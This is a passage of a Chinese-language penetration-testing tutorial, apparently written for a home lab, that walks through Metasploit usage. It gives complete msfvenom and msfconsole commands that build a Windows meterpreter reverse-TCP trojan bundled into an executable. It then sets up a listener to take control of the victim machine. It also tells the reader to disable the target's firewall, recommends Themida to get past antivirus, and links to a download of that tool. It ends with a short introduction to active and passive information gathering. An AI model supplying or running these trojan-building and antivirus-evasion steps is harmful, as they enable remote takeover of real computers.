# 查看帮助
show options

# 设置攻击的目标地址 如下图
set RhOSTS 192.168.207.129

# 再次查询 show options 就可以看到RhOSTS 有ip了

# pyload 如果是linux需要设置（这里是windows可以忽略） 如下图
set payload

# set LHOST 设置kali的攻击机ip set LPORT 设置端口 1-65535之间 （忽略）

# 运行攻击 `记得去靶机的控制面板关闭防火墙`
run

# 出现如上图说明获得了对方电脑的控制权
#help 查询帮助

2.msfvenom工具（生成木马病毒控制）

msfvenom工具是用来生成后门的软件，在目标机上执行后门，在本地监听上线
msfvenom在shell使用，不是msfconsole终端

# -p payload | windows/x64/meterpreter/reverse_tcp  payload_name | lhost kali的ip | -f format | -x 免杀 | -o output | exe windows可执行文件 可以是apk 或者其他的可以执行文件
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.207.128 lport=9999 -f exe -x demo.exe -o demo.exe

将demo.exe病毒文件上传到靶机

# 开启监听
msfconsole
use exploit/multi/handler
show options

# 跟刚刚生成木马的地址和端口,payload 要一致
set payload windows/x64/meterpreter/reverse_tcp
set LhOST 192.168.207.128
set LpoRT 9999
show options
run

开启监听后，点击demo.exe 在看kali 就会获取控制权

如果捆绑的程序仍然被杀毒软件杀了，使用工具Themida 可以轻松绕过

软件下载地址：https://wwpq.lanzouq.com/i4CPG1fanrre

什么是信息收集

信息收集简介卜什么是信息收集信息收集是指通过各种方式获取所需要的信息，以便我们在后续的渗透过程更好的进行。比如目标站点 lp

  • 信息收集的分类
  • 主动信息收集
  • 通过直接访问网站在网站上进行操作、对网站进行扫描等，这种是有网络流量经过目标服务器的信息收集方式
  • 被动信息收集
  • 基于公开的渠道，比如搜索引擎等，在不与目标系统直接交互的情况下获取信息，并且尽量避免留下痕迹
